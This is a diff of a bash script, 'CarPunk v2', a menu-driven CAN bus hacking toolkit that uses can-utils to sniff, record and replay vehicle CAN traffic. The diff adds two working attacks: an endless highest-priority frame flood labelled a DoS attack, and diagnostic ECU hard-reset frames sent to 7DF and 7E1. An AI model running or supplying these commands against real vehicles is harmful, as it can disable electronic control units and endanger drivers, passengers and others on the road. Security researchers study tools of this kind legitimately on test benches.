@@ -1,7 +1,7 @@
 #!/bin/bash
 
 
-#Project: CarPunk
+#Project: CarPunk v2 (CAN Injection Toolkit)
 #Coded By: souravbaghz
 
 #+++++++++++++++++++++++++ WARNINGS ++++++++++++++++++++++++++ 
@@ -21,34 +21,39 @@ green="\e[92m"
 redbg="\e[41m"
 greenbg="\e[40m"
 
+banner(){
+echo -e "$green
+
+       ▄▄▐▀▀▀▀▀▀▀▀▀▀▀▌▄▄
+      ▄▄▄█▄▄▄▄▄▄▄▄▄▄▄█▄▄▄
+      █▄█░░█▓█▓█▓█▓█░░█▄█▌
+      ▓▓█▀███████████▀█▓▓
+      ▓▓▀▀${reset}souravbaghz${green}▀▀▓▓   
+  █▀▀ ▄▀█ █▀█ █▀█ █░█ █▄░█ █▄▀
+  █▄▄ █▀█ █▀▄ █▀▀ █▄█ █░▀█ █░█
+      ${bold}ⲤⲀⲚ Ⲓⲛ𝓳ⲉⲥⲧⲓⲟⲛ Ⲧⲟⲟ𝓵ⲕⲓⲧ$reset                            
+ $reset──────────────────────────────"
+}
+
+if [ -z "$1" ]
+  then
+    banner
+    echo " Interface is not supplied"  #interface not supplied 
+    echo " Usage : carpunk.sh <Inferface>"
+    echo " Example: ./carpunk.sh can0"
+    exit 1
+fi
 
 mkdir -p logs
 #var
-msg="          Hack the Car"
+msg="          HACK THE CAR"
 inc="1"
 
 #=============================================
-# PLEASE CHANGE THE INTERFACE AND LOG-NAME
-i="vcan0"
+# YOU CAN CHANGE THE VARIABLE FOR LOG.
+interface="$1"
 log="carpunk"
 #=============================================
-
-
-
-banner(){
-echo -e "${green}
-|──────────────────────────────────────|         
-   ▄▄·  ▄▄▄· ▄▄▄   ▄▄▄·▄• ▄▌ ▐ ▄ ▄ •▄  
-  ▐█ ▌▪▐█ ▀█ ▀▄ █·▐█ ▄██▪██▌•█▌▐██▌▄▌▪ 
-  ██ ▄▄▄█▀▀█ ▐▀▀▄  ██▀·█▌▐█▌▐█▐▐▌▐▀▀▄· 
-  ▐███▌▐█ ▪▐▌▐█•█▌▐█▪·•▐█▄█▌██▐█▌▐█.█▌ 
-  ·▀▀▀  ▀  ▀ .▀  ▀.▀    ▀▀▀ ▀▀ █▪·▀  ▀      
-       ${greenbg}${green}<:coded by souravbaghz:>${reset}
-   $msg                                          
-$green|──────────────────────────────────────|$reset
-        "
-}
-
 
 trap ctrl_c INT
 
@@ -61,43 +66,48 @@ ctrl_c(){
 menu(){
 clear
 banner
-echo -e " [1] UP the CAN Interface"
-echo -e " [2] Down the CAN Interface"
-echo -e " [3] Start the Basic Sniffing"
-echo -e " [4] Record the CAN Packets"
-echo -e " [5] Play the CAN Packets"
+echo -e "$bold$green$msg$reset"
+echo -e " ──────────────────────────────$reset"
+echo -e "$red [1]$green UP The CAN Interface"
+echo -e "$red [2]$green Down The CAN Interface"
+echo -e "$red [3]$green Start The Basic Sniffing"
+echo -e "$red [4]$green Record The CAN Packets"
+echo -e "$red [5]$green Play The CAN Packets"
+echo -e "$red [6]$green CAN Injection DOS Attack"
+echo -e "$red [7]$green ECU Hard Reset"
 
-echo -e " [0] Exit"
-read -p " [>] Choose: " option
+echo -e "$red [0]$green Exit$reset"
+read -p " [?] Choose: " option
 
 if [[ $option = 1 || $option = 01 ]]
 	then
-        ip link set $i up
-        msg="      Interface Is UP Now!"
+        ip link set $interface up
+        msg="      Interface is up now!"
         clear
 		menu
 
 	elif [[ $option = 2 || $option = 02 ]]
 	   then
-	    ip link set $i down
-        msg="     Interface Is Down Now!"
+	    ip link set $interface down
+        msg="     Interface is down now!"
         clear
 		menu
         
     elif [[ $option = 3 || $option = 03 ]]
        then
-         echo -e "${red}+${reset}------------------------------------${red}+${reset}"
-         msg="       Happy Car Hacking"
-         cansniffer $i -c
+         echo -e " ──────────────────────────────"
+         msg="       HAPPY CAR HACKING"
+         cansniffer $interface -c
 		 read -r -s -p $'Press ENTER to go menu.'
          clear
 		 menu
 		 
 	elif [[ $option = 4 || $option = 04 ]]
        then
-         echo -e "${red}+${reset}------------------------------------${red}+${reset}"
-         msg=" Recorded & Stored as $log$inc.log"
-         candump -L $i >logs/$log$inc.log
+         echo -e " ──────────────────────────────"
+         msg=" Recorded & stored as $log$inc.log"
+         echo -e "$green Dumping CAN Packets..."
+         candump -L $interface >logs/$log$inc.log
          inc=$((inc+1))
          echo " >"
 		 read -r -s -p $'Press ENTER to go menu.'
@@ -105,14 +115,36 @@ if [[ $option = 1 || $option = 01 ]]
 
     elif [[ $option = 5 || $option = 05 ]]
        then
-         echo -e "${red}+${reset}------------------------------------${red}+${reset}"
+         echo -e " ──────────────────────────────"
          msg="    Replay Attack Completed"
          read -p "[?]Enter log name: " logname
+         echo -e "$green Playing CAN Packets..."
          canplayer -I logs/$logname
          clear
 		 menu
 		  	 
-		 
+	elif [[ $option = 6 || $option = 06 ]]
+       then
+         echo -e " ──────────────────────────────"
+         msg="      DOS Attack Completed"
+         while true
+         do
+           echo "Executing DOS Attack..."
+           cansend $interface 000#0000000000000000  
+              clear
+            done
+         clear
+		 menu
+	
+	elif [[ $option = 7 || $option = 07 ]]
+       then
+         echo -e " ──────────────────────────────"
+         msg="    ECU Hard Reset Completed"
+         cansend $interface 7DF#0211010000000000
+         cansend $interface 7E1#0211010000000000
+         clear
+		 menu
+		 	 	 
 	elif [[ $option = 0 || $option = 00 ]]
        then
          echo -e "[!]Exiting...${green}${reset}"
@@ -130,4 +162,3 @@ if [[ $option = 1 || $option = 01 ]]
 
 
 menu
-
